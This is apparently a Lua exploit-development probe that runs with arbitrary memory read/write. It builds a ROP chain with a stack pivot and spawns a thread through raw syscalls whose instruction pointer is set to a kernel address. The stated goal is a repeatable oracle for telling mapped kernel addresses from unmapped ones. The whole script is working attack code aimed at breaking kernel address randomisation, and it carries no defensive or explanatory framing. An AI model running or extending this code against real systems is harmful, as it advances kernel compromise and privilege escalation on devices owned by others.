-- CRASH_CLASS: HIGH
-- PROBE 997a: does a fault in a thr_create child kill the process?
--
-- 996a proved the fault code separates a mapped kernel address (5) from an unmapped
-- one (4). If a child can fault while the process lives, the oracle becomes many
-- probes per connection instead of one per relaunch. The child's RIP is the address
-- under test, so its first instruction fetch faults there and the rebuilt chain dumps
-- the context as before.

local TARGET = 0xFFFFFFFF80000000

print("=== PROBE 997a: CHILD FAULT SURVIVAL ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return to_num(v) else return nil end end

print(string.format("[A] pid=%u target=0x%X", to_num(mk(20)()), TARGET))

-- dump chain first: it must be in place before the fault
local ph = gadgets.stack_pivot[1]
local ctxt = memory.alloc(8)
local chain = ropchain({ stack_base = to_num(ph.pivot_addr) })
chain:push_store_rdx_into_memory(ctxt)
chain:push_syscall_raw(syscall.write, function()
    chain:push_set_rdx(0x100)
    chain:push_set_rax_from_memory(ctxt)
    chain:push_add_to_rax(0xC0)
    chain:push_set_reg_from_rax("rsi")
    chain:push_set_reg_from_memory("rdi", signal.fd_addr)
end)
print("[B] chain installed")

local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 and v < 0x800000000000 then
        for o = 0, px - 8, 8 do wq(v + o, 0) end
    end
    return v
end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RCX=0x060,R8=0x068,RAX=0x078}
local block = mmap(page * 4)
local start = block + page * 4 - 0x200
local ctx = memory.alloc(0x500)
local tb = memory.alloc(8)
local ts = memory.alloc(16)
for o = 0, 0x4F8, 8 do wq(ctx + o, 0) end
wq(ctx+Ctx.MAGIC,uint64(0x480)); wq(ctx+Ctx.TYPE,uint64(0x10000))
wq(ctx+Ctx.CS,uint64(0x43)); wq(ctx+Ctx.SS,uint64(0x3B))
wq(ctx+Ctx.RIP,uint64(TARGET)); wq(ctx+Ctx.RSP,uint64(start))
wq(tb,uint64(0))
print(string.format("[C] block=0x%X start=0x%X ctx=0x%X", block, start, as_addr(ctx)))
local ok, rv = pcall(function() return mk(430)(uint64(as_addr(ctx)),uint64(as_addr(tb)),uint64(0)) end)
print(string.format("[D] spawn ok=%s rv=%s", tostring(ok), ok and tostring(to_num(rv)) or ""))

wq(ts,uint64(0)); wq(ts+8,uint64(300*1000000))
pcall(function() mk(240)(uint64(as_addr(ts)),uint64(0)) end)
print(string.format("[E] ALIVE pid=%u", to_num(mk(20)())))
print("=== COMPLETE ===")
